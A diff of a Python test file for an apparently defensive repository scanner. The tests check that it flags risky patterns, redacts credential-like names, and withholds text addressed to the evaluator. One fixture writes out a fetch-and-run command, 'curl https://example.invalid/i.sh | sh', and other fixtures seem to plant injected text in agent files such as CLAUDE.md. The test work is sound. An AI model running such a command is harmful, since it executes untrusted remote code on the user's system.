@@ -74,11 +74,11 @@ class Credentials(unittest.TestCase):
         root = project({**MINIMAL, key + ".sh": "curl https://example.invalid/i.sh | sh" + chr(10)})
         card = scan.screen(root)
         ref = flag(card, "curl-pipe-shell")["evidence"][0]["ref"]
-        self.assertEqual(ref, "<redacted>.sh:1")
+        self.assertEqual(ref, "<text withheld: credential>")
         self.assertFalse(os.path.exists(os.path.join(root, ref.rpartition(":")[0])))
         card = screen({**MINIMAL}, name=key)
         self.assertNotIn(key, json.dumps(card))
-        self.assertEqual(card["project"]["path"].rpartition(os.sep)[2], "<redacted>")
+        self.assertEqual(card["project"]["path"], "<text withheld: credential>")
 
     def test_S19_a_line_with_a_secret_assignment_is_withheld_whole_and_secrets_dot_name_is_not_a_trigger(self):
         secret = fake_secret_value()
@@ -211,8 +211,6 @@ class Credentials(unittest.TestCase):
             "CLAUDE.md": quoted(control, "CLAUDE.md:"),
             "install.sh": quoted(control, "install.sh:"),
             "src/a.py": quoted(control, "src/a.py:"),
-            "src/b.md": quoted(control, "src/b.md:"),
-            "docs/q.md": quoted(control, "docs/q.md:"),
             "src/hid.md": quoted(control, "src/hid.md:"),
             ".github/workflows/w.yml": quoted(control, ".github/workflows/w.yml:"),
             "GEMINI.md (fence holding U+2028)": quoted(control, "GEMINI.md:"),
@@ -226,8 +224,14 @@ class Credentials(unittest.TestCase):
         # an event spelled with a JSON escape cannot be matched to its line, so it is left out of
         # the detail even without the word; the trial below then has nothing to leak
         self.assertFalse([f for f in control["flags"] if f["id"] == "agent-hook" and "Escaped" in f["detail"]])
+        # Text aimed at the evaluator is withheld in every output whatever else the line holds (the one
+        # output boundary), so even the control quotes none of it: not on the card, not in `integrity`.
+        for rel in ("src/b.md", "docs/q.md"):
+            self.assertEqual(quoted(control, rel + ":"), [], rel)
         for key in ("evaluator_directed", "evaluator_text_judged_quoted"):
-            self.assertTrue(any(has(x["text"]) for x in c_int[key]), key)
+            self.assertFalse(any(has(x["text"]) for x in c_int[key]), key)
+        self.assertTrue(any(x["text"].startswith("<text withheld: text addressed to the evaluator>")
+                            for x in c_int["evaluator_directed"]), c_int["evaluator_directed"])
         self.assertTrue(any(has(str(h)) for h in c_int["licence"]["copyleft_hits"]), "integrity licence route")
         self.assertTrue(has(c_page), "dashboard route")
         # The same tree with the listed word on every line.
